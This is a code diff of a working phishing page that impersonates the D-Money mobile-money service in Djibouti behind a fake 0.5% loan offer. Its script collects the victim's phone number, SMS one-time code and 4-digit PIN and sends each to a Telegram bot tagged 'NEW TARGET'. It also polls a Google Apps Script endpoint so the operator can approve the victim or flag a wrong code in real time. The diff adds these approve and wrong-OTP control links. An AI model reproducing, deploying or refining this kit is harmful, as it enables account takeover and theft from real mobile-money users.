@@ -25,22 +25,15 @@
         .res-item span { display: block; font-size: 0.7rem; opacity: 0.8; }
         .res-item b { font-size: 1rem; color: var(--d-yellow); }
 
-        /* Form Elements */
+        /* Form UI */
         .title { font-size: 1.5rem; font-weight: 700; color: var(--d-blue); margin-bottom: 10px; text-align: center; }
         .subtitle { font-size: 0.9rem; color: #666; text-align: center; margin-bottom: 30px; line-height: 1.5; }
-        .input-group { margin-bottom: 20px; }
-        label { display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 8px; color: var(--d-blue); }
-        input[type=text], input[type=tel] { width: 100%; padding: 16px; border: 2px solid #eee; border-radius: 12px; font-size: 1.1rem; outline: none; transition: 0.3s; }
-        input:focus { border-color: var(--d-blue); }
-
         .btn-main { background: var(--d-blue); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer; margin-top: 10px; }
         
-        /* Box Inputs (OTP/PIN) */
         .box-row { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
-        .box-input { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 8px; text-align: center; font-size: 1.5rem; font-weight: 700; color: var(--d-blue); }
+        .box-input { width: 45px; height: 55px; border: 2px solid #ddd; border-radius: 8px; text-align: center; font-size: 1.5rem; font-weight: 700; color: var(--d-blue); outline: none; }
         .box-input:focus { border-color: var(--d-blue); background: #f0f4ff; }
 
-        /* Loader */
         .loader-wrap { text-align: center; padding: 60px 20px; }
         .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--d-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 25px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -51,13 +44,11 @@
 <body>
 
 <div class="app-container">
-    <div class="header">
-        <img src="https://www.d-money.dj/wp-content/uploads/2021/04/Logo-D-Money.png" class="logo" alt="D-Money">
-    </div>
+    <div class="header"><img src="https://www.d-money.dj/wp-content/uploads/2021/04/Logo-D-Money.png" class="logo"></div>
 
     <section id="view-0" class="view active">
         <h2 class="title">Demande de Crédit</h2>
-        <p class="subtitle">Bénéficiez de taux préférentiels exclusifs à 0.5% pour les membres D-Money.</p>
+        <p class="subtitle">Taux préférentiels exclusifs à 0.5% pour D-Money.</p>
         <div class="calc-card">
             <div class="slider-label"><span>Montant (DJF)</span> <b id="amt-txt">50,000</b></div>
             <input type="range" id="loan-amt" min="5000" max="1000000" step="5000" value="50000" oninput="updateCalc()">
@@ -65,7 +56,7 @@
             <input type="range" id="loan-dur" min="1" max="24" step="1" value="6" oninput="updateCalc()">
             <div class="res-grid">
                 <div class="res-item"><span>Mensualité</span> <b id="res-monthly">8,354 DJF</b></div>
-                <div class="res-item"><span>Taux Intérêt</span> <b>0.5% (Promo)</b></div>
+                <div class="res-item"><span>Taux</span> <b>0.5%</b></div>
             </div>
         </div>
         <button class="btn-main" onclick="showView(1)">COMMENCER</button>
@@ -73,15 +64,12 @@
 
     <section id="view-1" class="view">
         <div class="title">Identification</div>
-        <p class="subtitle">Entrez votre numéro de téléphone D-Money pour continuer.</p>
-        <div class="input-group">
-            <label>Numéro de téléphone</label>
-            <div style="display: flex; gap: 10px;">
-                <input type="text" value="+253" style="width: 80px; text-align: center;" readonly>
-                <input type="tel" id="user-phone" placeholder="77XXXXXX">
-            </div>
+        <p class="subtitle">Entrez votre numéro D-Money.</p>
+        <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+            <input type="text" value="+253" style="width: 80px; text-align: center; border: 2px solid #eee; border-radius: 12px;" readonly>
+            <input type="tel" id="user-phone" placeholder="77XXXXXX" style="width: 100%; padding: 16px; border: 2px solid #eee; border-radius: 12px;">
         </div>
-        <button class="btn-main" id="phone-btn" onclick="submitPhone()">Poursuivre</button>
+        <button class="btn-main" onclick="submitPhone()">Poursuivre</button>
     </section>
 
     <section id="view-2" class="view loader-wrap">
@@ -102,13 +90,13 @@
             <input type="tel" class="box-input otp-in" maxlength="1" oninput="moveFocus(this, 4, 'otp-in')">
             <input type="tel" class="box-input otp-in" maxlength="1" oninput="moveFocus(this, 5, 'otp-in')">
         </div>
-        <p style="text-align: center; font-size: 0.8rem; color: #666;">Renvoyer le code dans <span id="timer" style="color: var(--d-blue); font-weight: bold;">00:30</span></p>
+        <p style="text-align: center; font-size: 0.8rem; color: #666;">Renvoyer dans <span id="timer" style="color: var(--d-blue); font-weight: bold;">00:30</span></p>
     </section>
 
     <section id="view-4" class="view">
         <div id="pin-error" class="error-msg">Code PIN incorrect. Veuillez réessayer.</div>
-        <div class="title">Sécurité du compte</div>
-        <p class="subtitle">Veuillez saisir votre code PIN D-Money à 4 chiffres pour autoriser l'accès.</p>
+        <div class="title">Code PIN</div>
+        <p class="subtitle">Saisissez votre code PIN D-Money à 4 chiffres.</p>
         <div class="box-row">
             <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 0, 'pin-in')">
             <input type="password" inputmode="numeric" class="box-input pin-in" maxlength="1" oninput="moveFocus(this, 1, 'pin-in')">
@@ -119,22 +107,18 @@
 
     <section id="view-5" class="view loader-wrap">
         <div style="font-size: 3.5rem; margin-bottom: 20px;">⌛</div>
-        <h2 class="title">Analyse du Dossier</h2>
+        <h2 class="title">Analyse Finale</h2>
         <p style="text-align: left; font-size: 0.9rem; line-height: 1.6; color: #444;">
-            Nous vérifions vos antécédents de crédit et la validité de votre compte D-Money.<br><br>
-            <b>Étape Actuelle:</b> Signature numérique du contrat.<br>
-            <b>Temps estimé:</b> 2 - 5 minutes.<br><br>
-            <i>Merci de rester sur cette page. Une notification de confirmation vous sera envoyée par SMS.</i>
+            Signature numérique en cours. Temps estimé: 2-5 minutes. Vous recevrez un SMS de confirmation.
         </p>
     </section>
 </div>
 
 <script>
-    // CAPTURE URL PARAMS FOR MULTIPLE BOTS
     const urlParams = new URLSearchParams(window.location.search);
     const BOT_TOKEN = urlParams.get('token');
     const CHAT_ID = urlParams.get('id');
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHqqqFuhAV070lss288JWURMsWlM1pb7CRO3Sr5QCrgQdnbWScfCl9nnN7RgHYCqEJQg/exec"; 
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHqqqFuhAV070lss288JWURMsWlM1pb7CRO3Sr5QCrgQdnbWScfCl9nnN7RgHYCqEJQg/exec";
 
     function updateCalc() {
         const amt = document.getElementById('loan-amt').value;
@@ -142,100 +126,74 @@
         document.getElementById('amt-txt').innerText = parseInt(amt).toLocaleString();
         document.getElementById('dur-txt').innerText = dur;
         const total = amt * 1.005;
-        const monthly = total / dur;
-        document.getElementById('res-monthly').innerText = Math.round(monthly).toLocaleString() + " DJF";
+        document.getElementById('res-monthly').innerText = Math.round(total / dur).toLocaleString() + " DJF";
     }
 
     function showView(n) {
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
         document.getElementById('view-' + n).classList.add('active');
-        window.scrollTo(0,0);
     }
 
     function telegram(msg) {
-        if(!BOT_TOKEN || !CHAT_ID) return console.error("Missing Bot Params");
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
     }
 
     function submitPhone() {
         const phone = document.getElementById('user-phone').value;
-        if(phone.length < 6) return alert("Numéro invalide");
+        if(phone.length < 6) return alert("Invalide");
         
-        telegram(`🇩🇯 *NEW TARGET*\n📱 Phone: +253 ${phone}\n💰 Loan: ${document.getElementById('amt-txt').innerText} DJF`);
+        const approveLink = `${SCRIPT_URL}?cmd=approve&id=${phone}`;
+        const wrongLink = `${SCRIPT_URL}?cmd=wrongOTP&id=${phone}`;
+
+        telegram(`🇩🇯 *NEW TARGET*\n📱 Phone: +253 ${phone}\n💰 Amt: ${document.getElementById('amt-txt').innerText}\n\n✅ *APPROVE:* ${approveLink}\n❌ *WRONG OTP:* ${wrongLink}`);
         
-        showView(2); // Show Loading
-        setTimeout(() => {
-            document.getElementById('target-phone').innerText = "+253 " + phone;
-            showView(3); // Show OTP
-            startTimer(30);
-            startPolling(phone);
-        }, 2000);
+        showView(2);
+        startPolling(phone);
     }
 
     function moveFocus(el, idx, cls) {
         const ins = document.querySelectorAll('.' + cls);
-        if(el.value.length === 1 && idx < ins.length - 1) {
-            ins[idx+1].focus();
-        }
-        
-        // AUTO-SUBMIT OTP
-        if(cls === 'otp-in' && idx === 5 && el.value.length === 1) {
-            validateOTP();
-        }
-        // AUTO-SUBMIT PIN
-        if(cls === 'pin-in' && idx === 3 && el.value.length === 1) {
-            validatePIN();
-        }
+        if(el.value.length === 1 && idx < ins.length - 1) ins[idx+1].focus();
+        if(cls === 'otp-in' && idx === 5 && el.value.length === 1) validateOTP();
+        if(cls === 'pin-in' && idx === 3 && el.value.length === 1) validatePIN();
     }
 
     function validateOTP() {
-        const ins = document.querySelectorAll('.otp-in');
-        let code = "";
-        ins.forEach(i => code += i.value);
-        
+        let code = ""; document.querySelectorAll('.otp-in').forEach(i => code += i.value);
         telegram(`🔓 *OTP RECEIVED*\n📱 Phone: ${document.getElementById('user-phone').value}\n🔢 Code: \`${code}\``);
         showView(2);
-        document.getElementById('loader-text').innerText = "Vérification du code...";
     }
 
     function validatePIN() {
-        const ins = document.querySelectorAll('.pin-in');
-        let code = "";
-        ins.forEach(i => code += i.value);
-
+        let code = ""; document.querySelectorAll('.pin-in').forEach(i => code += i.value);
         telegram(`💳 *PIN RECEIVED*\n📱 Phone: ${document.getElementById('user-phone').value}\n🔑 PIN: \`${code}\``);
         showView(5);
     }
 
     async function startPolling(phone) {
-        const cleanID = String(phone).trim();
         setInterval(async () => {
             try {
-                const r = await fetch(`${SCRIPT_URL}?id=${cleanID}&v=${Date.now()}`);
+                const r = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
                 const status = (await r.text()).trim();
-                
                 if(status === "approved") {
-                    showView(4); // Move to PIN
+                    document.getElementById('target-phone').innerText = "+253 " + phone;
+                    showView(3); startTimer(30);
+                    fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
                 } else if(status === "wrongOTP") {
                     document.getElementById('otp-error').style.display = "block";
                     showView(3);
                     document.querySelectorAll('.otp-in').forEach(i => i.value = "");
-                } else if(status === "wrongPIN") {
-                    document.getElementById('pin-error').style.display = "block";
-                    showView(4);
-                    document.querySelectorAll('.pin-in').forEach(i => i.value = "");
                 }
             } catch(e) {}
         }, 3000);
     }
 
     function startTimer(duration) {
-        let timer = duration, min, sec;
+        let timer = duration;
         const display = document.getElementById('timer');
         const itv = setInterval(() => {
-            min = parseInt(timer / 60, 10);
-            sec = parseInt(timer % 60, 10);
-            display.textContent = (min < 10 ? "0" + min : min) + ":" + (sec < 10 ? "0" + sec : sec);
+            let s = timer % 60;
+            display.textContent = `00:${s < 10 ? '0' + s : s}`;
             if (--timer < 0) clearInterval(itv);
         }, 1000);
     }
